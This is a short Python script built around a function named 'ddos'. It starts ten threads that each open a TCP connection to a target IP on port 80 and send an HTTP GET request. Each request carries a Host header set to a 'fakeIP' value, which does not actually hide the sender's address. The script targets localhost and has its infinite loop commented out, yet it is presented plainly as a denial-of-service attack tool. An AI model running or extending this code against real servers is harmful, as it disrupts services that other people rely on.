
import socket
import threading

targetIP = '127.0.0.1'
fakeIP = '182.21.20.32'
port = 80
def ddos():
    #while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((targetIP, port))
        s.sendto(("GET /" + targetIP + " HTTP/1.1\r\n").encode('ascii'), (targetIP, port))
        s.sendto(("Host: " + fakeIP + "\r\n\r\n").encode('ascii'), (targetIP, port))
        s.close()

for i in range(10):
     thread = threading.Thread(target=ddos)
     thread.start()
     print("Connection number",i)
